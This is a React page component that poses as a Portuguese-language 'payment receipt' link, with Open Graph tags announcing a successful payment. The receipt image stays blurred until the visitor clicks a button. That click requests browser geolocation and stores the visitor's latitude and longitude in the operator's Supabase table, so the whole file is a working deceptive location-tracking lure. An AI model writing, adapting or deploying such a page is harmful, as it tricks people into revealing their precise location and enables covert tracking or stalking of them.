/* eslint-disable @typescript-eslint/no-unused-vars */
import { EyeIcon } from 'lucide-react'
import { useState } from 'react'
import { Helmet } from 'react-helmet-async'

import { supabase } from '../@config/supabase'

export const Home = () => {
  const [_, setLocationPermission] = useState<'idle' | 'granted' | 'denied'>(
    'idle',
  )

  const [hasToggleButtonLocation, setHasToggleButtonLocation] = useState(true)

  const requestLocationPermission = async () => {
    if (!('geolocation' in navigator) || !('permissions' in navigator)) {
      console.log('Geolocalização não suportada pelo navegador.')
      setLocationPermission('denied')
      return
    }

    try {
      const permissionStatus = await navigator.permissions.query({
        name: 'geolocation',
      })

      if (permissionStatus.state === 'granted') {
        setLocationPermission('granted')
        getUserLocation()
      } else if (permissionStatus.state === 'prompt') {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            setLocationPermission('granted')
            await saveLocation(position)
          },
          (err) => {
            console.error('Erro ao obter localização:', err)
            setLocationPermission('denied')
          },
        )
      } else {
        console.warn('Permissão de localização negada.')
        setLocationPermission('denied')
      }
    } catch (error) {
      console.error('Erro ao verificar permissão de localização:', error)
      setLocationPermission('denied')
    }
  }

  const getUserLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        await saveLocation(position)
      },
      (err) => {
        console.error('Erro ao obter localização:', err)
        setLocationPermission('denied')
      },
    )
  }

  const saveLocation = async (position: GeolocationPosition) => {
    try {
      await supabase.from('ip').insert([
        {
          lat: position.coords.latitude,
          lon: position.coords.longitude,
        },
      ])

      setHasToggleButtonLocation(false)
    } catch (error) {
      console.error('Erro ao salvar localização no banco:', error)
    }
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center gap-4 bg-zinc-50">
      <Helmet title="Comprovante de pagamento disponível">
        <meta property="og:title" content="Pagamento concluído com sucesso" />
        <meta
          property="og:description"
          content="Seu pagamento foi concluído com sucesso. Caso queira ver o comprovante, basta acessar o link."
        />
        <meta
          property="og:image"
          content="https://i.pinimg.com/736x/f9/fe/50/f9fe50dbdfd23e12ad00f3ddad477b8c.jpg"
        />
        <meta
          property="image"
          content="https://i.pinimg.com/736x/f9/fe/50/f9fe50dbdfd23e12ad00f3ddad477b8c.jpg"
        />
        <meta property="og:image:type" content="image/jpg" />
        <meta property="og:image:width" content="635" />
        <meta property="og:image:height" content="476" />
        <meta property="og:type" content="website" />
      </Helmet>

      <div className="relative overflow-hidden rounded-2xl border">
        {hasToggleButtonLocation && (
          <div className="absolute left-0 top-0 flex h-full w-full items-center justify-center backdrop-blur-sm">
            <button
              onClick={requestLocationPermission}
              className="rounded-md bg-blue-600 p-4 text-white hover:bg-blue-700"
            >
              <EyeIcon className="size-7" />
            </button>
          </div>
        )}
        <img
          src="/comprovante.png"
          alt="Comprovante de pagamento"
          className="pointer-events-none w-[400px] select-none object-contain"
        />
      </div>
    </main>
  )
}
